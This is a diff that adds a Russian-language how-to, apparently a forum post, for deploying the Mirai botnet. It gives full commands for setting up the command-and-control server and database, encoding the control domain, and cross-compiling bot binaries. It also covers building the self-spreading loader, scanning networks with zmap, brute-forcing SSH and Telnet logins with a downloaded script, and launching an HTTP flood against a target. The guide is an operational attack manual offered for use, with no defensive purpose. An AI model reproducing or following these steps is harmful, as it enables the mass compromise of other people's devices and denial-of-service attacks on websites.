@@ -1,0 +1,244 @@
+# apt-get update -y
+# apt-get upgrade -y
+# apt-get install unzip gcc golang electric-fence screen sudo git -y
+# apt-get install mysql-server -y
+# apt-get install mysql-client -y
+# apt-get install apache2 -y
+При установке MySQL, нужно будет создать пароль для доступа к MySQL для root пользователя. Пароль нормальный придумаете, без всяких " qwerty "
+Запишите куда нибудь, он нам еще будет нужен.
+
+
+
+==============================================================
+
+
+
+
+# sudo apt-get install curl git mercurial make binutils bison gcc build-essential -y
+# bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)
+# gvm install go1.4
+# gvm use go1.4 [--default]
+# gvm install go1.4 -B
+# gvm use go1.4
+# export GOROOT_BOOTSTRAP=$GOROOT
+# gvm install go1.5
+# gvm use go1.5
+# gvm install go1.8
+# gvm use go1.8
+
+
+
+
+==============================================================
+
+
+
+После установки всех утилит, качаем исходники бота - https://github.com/jgamblin/Mirai-Source-Code и загружаем на сервер. Командой wget, или просто через программу WinSCP.
+# unzip Mirai-Source-Code-master.zip
+# cd Mirai-Source-Code-Master/mirai/tools
+# gcc enc.c -o enc
+# ./enc string vlmi.su ( свой домен пишем, который прикрутили к серверу ) и жмем Enter
+Тут вы увидите такой текст -
+XOR'ing 14 bytes of data...
+\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
+14 - тут будет другая цифра у вас, так что не волнуйтесь, всё правильно.
+Копируем весь этот текст.
+Открываем через nano редактор, или же через WinSCP файл table.c который находится в папке mirai/bot
+Должны увидеть это - https://prnt.sc/gcxa2m
+Строка add_entry(TABLE_CNC_DOMAIN - всё что в кавычках меняем на свой текст, который только что скопировали. Вместо " 30 " пишем свою цифру, которую тоже только что скопировали. Тоже самое делаем с строкой add_entry(TABLE_SCAN_CB_DOMAIN
+Сохраняем, и закрываем редактор.
+Идем дальше.
+Открываем редактором файл mirai/cnc/main.go
+Видим это - https://prnt.sc/gcxdtz
+"127.0.0.1" меняем на "127.0.0.1:3306"
+"password" меняем на наш MySQL пароль который вводили ранее. "
+Сохраняем файл, и закрываем редактор.
+Просто копируйте всю эту хуйню, рассказывать зачем это нужно, не буду -
+
+
+
+# mkdir /etc/xcompile
+# cd /etc/xcompile
+
+
+==============================================================
+
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+# wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+# wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+
+# tar -jxf cross-compiler-armv4l.tar.bz2
+# tar -jxf cross-compiler-i586.tar.bz2
+# tar -jxf cross-compiler-m68k.tar.bz2
+# tar -jxf cross-compiler-mips.tar.bz2
+# tar -jxf cross-compiler-mipsel.tar.bz2
+# tar -jxf cross-compiler-powerpc.tar.bz2
+# tar -jxf cross-compiler-sh4.tar.bz2
+# tar -jxf cross-compiler-sparc.tar.bz2
+# tar -jxf cross-compiler-armv6l.tar.bz2
+
+# rm *.tar.bz2
+
+# mv cross-compiler-armv4l armv4l
+# mv cross-compiler-i586 i586
+# mv cross-compiler-m68k m68k
+# mv cross-compiler-mips mips
+# mv cross-compiler-mipsel mipsel
+# mv cross-compiler-powerpc powerpc
+# mv cross-compiler-sh4 sh4
+# mv cross-compiler-sparc sparc
+# mv cross-compiler-armv6l armv6l
+
+# export PATH=$PATH:/etc/xcompile/armv4l/bin
+# export PATH=$PATH:/etc/xcompile/armv6l/bin
+# export PATH=$PATH:/etc/xcompile/i586/bin
+# export PATH=$PATH:/etc/xcompile/m68k/bin
+# export PATH=$PATH:/etc/xcompile/mips/bin
+# export PATH=$PATH:/etc/xcompile/mipsel/bin
+# export PATH=$PATH:/etc/xcompile/powerpc/bin
+# export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+# export PATH=$PATH:/etc/xcompile/sh4/bin
+# export PATH=$PATH:/etc/xcompile/sparc/bin
+# export PATH=$PATH:/etc/xcompile/armv6l/bin
+
+# export PATH=$PATH:/usr/local/go/bin
+# export GOPATH=$HOME/Documents/go
+
+# go get github.com/go-sql-driver/mysql
+# go get github.com/mattn/go-shellwords
+
+
+
+==============================================================
+
+
+# cd Mirai-Source-Code-master/mirai
+# ./build.sh debug telnet
+# ./build.sh release telnet
+# cd Mirai-Source-Code-master/mirai/release
+# mv mirai* /var/www/html
+# cd /var/www/html
+# mkdir bins
+# mv * bins/
+# cd
+
+
+
+==============================================================
+
+
+Теперь MySQL.
+# mysql -u root -p
+Тут попросят пароль. Вводим пароль который ранее установили.
+# create database mirai;
+
+# use mira
+
+Теперь копируем весь текст от сюда - https://pastebin.com/QVD48J8s вставляем, и жмем Enter.
+
+Копируем текст от сюда - https://pastebin.com/JwYSgE4v
+
+Вместо anna-senpai пишем свой логин. Любой. Так же и с myawesomepassword. Эти данные нам нужны будут для доступа в панель управления ботом.
+Должно быть вот так - INSERT INTO users VALUES (NULL, 'pizdec', 'zaebalsjapisatj', 0, 0, 0, 0, -1, 1, 30, '');
+Копируем, вставляем, жмем Enter.
+Теперь можно выходить.
+# exit
+
+==============================================================
+
+Уже почти всё.
+# cd Mirai-Source-Code-master/mirai/release
+# touch prompt.txt
+# screen ./cnc
+Должны увидеть надпись MySQL DB opened
+Не закрываем эту сессию, открываем новую.
+http://prntscr.com/gcxunx вместо vlmi.su пишем свой домен, и жмем Open.
+Вводим логин и пароль, в моем случае это -
+pizdec
+zaebalsjapisatj
+Всё, мы в панели управления ботом.
+
+==============================================================
+
+Теперь нам нужны боты. Тут всё просто, инсталлы никакие не нужны.
+Настроим loader.
+loader нужен для того чтобы ботов можно было бы добавлять с текстовых файлов. Допустим набрутили мы loT устройств ( роутеры, камеры, телефоны ) и чтобы их добавить в бот, нужен loader.
+Так же loader это " червь "
+Заразили одно устройство, и он дальше по цепочке будет брутить и добавлять ботов.
+Подключаемся к нашему серверу через PuTTY и WinSCP.
+С помощью WinSCP находим файл main.c в папке Mirai-Source-Code-master/dlr
+Пишем IP нашего сервера как на скрине - http://prntscr.com/gde6jr
+Запятые оставляем, так и должно быть. Сохраняем и закрываем.
+Теперь с PyTTY заходим на наш сервак и пишем -
+# cd Mirai-Source-Code-master/dlr
+# chmod 777 *
+# ./build.sh
+# cd release
+# mv dlr* ~/Mirai-Source-Code-master/loader/bins
+Теперь открывем WinSCP и находим файл main.c в папке Mirai-Source-Code-master/loader/src
+Меняем на свой IP как на скрине - http://prntscr.com/gdefbr
+Сохраняем и закрываем.
+
+Через PuTTY -
+# cd Mirai-Source-Code-master/loader
+# ./build.sh
+С помощью WinSCP открываем файл scanListen.go который можно найти в папке Mirai-Source-Code-master/mirai/tools
+Меняем на свой IP сервера - http://prntscr.com/gdezsh
+Потом с PyTTY -
+# cd Mirai-Source-Code-master/mirai/tools
+# go build scanListen.go
+Теперь у нас появился новый файл - scanListen ( без .go , просто scanListen )
+scanListen нужно переместить в папку Mirai-Source-Code-master/loader
+Просто с помощью WinSCP кидаем его в папку loader
+Теперь проверим работает ли всё
+# ./loader
+Если видите то что на скрине, значит всё правильно - https://prnt.sc/gdei1g
+Если возникают ошибки, пишите в тему, помогу.
+Чтобы загрузить ботов с списка, кидаем текстовик в папку loader и набираем команду -
+# cat list.txt | ./loader
+Всё, все боты которых вы набрутили будут у вас, будут ложить сайты по вашей команде.
+Я лично этот способ не использовал, нашел легче способ.
+
+
+
+==============================================================
+
+Тут нам нужен второй сервер. Так же на Debian 8.
+# apt-get update -y
+# apt-get upgrade -y
+# apt-get install python-paramiko -y
+# apt-get install zmap -y
+zmap нам нужен для сканирования портов. Принцип работы как у KPortScan, только в 50 раз быстрей.
+Копируем весь код от сюда - https://pastebin.com/9tq1pfAv и сохраняем как scan.py
+Тут вы можете добавить свои пароли, и логины - http://prntscr.com/gdesb1
+Строку combo не трогаем!
+Тут нужно прописать IP сервера на котором стоит бот - http://prntscr.com/gdetbn
+Меняем всё, и сохраняем.
+Файл scan.py кидаем в любое место на нашем сервере. На втором сервере, который чисто для сканирования, тот на котором бот не трогаем.
+Нам нужны IP которые мы будем сканировать.
+#zmap -p22 -o list.txt -B 100M ( можно и другие порты сканировать, я сканировал 22 или 23 всегда )
+Все результаты будут в файле list.txt
+После того как собрали IP ( чем больше тем лучше ) файл list.txt кидаем рядом к файлу scan.py и пишем -
+# python scan.py list.txt 500
+Всё, сидим и смотрим как растет наш ботнет.
+
+
+
+==============================================================
+
+
+Когда наберется хотя бы 200 ботов, можно запустить loader.
+Для этого заходим на сервер где установлен ботнет и -
+# cd Mirai-Source-Code-master/loader
+# ulimit -n 9999999
+# ./scanListen | ./loader
+Теперь бот будет работать по принципу " червя " и добивать еще ботов.
+
+Команда для DDoS атаки ( вводить нужно в панели управления ботнетом )
+# http 1.1.1.1 350 domain=1.1.1.1 path=/ conns=999999999
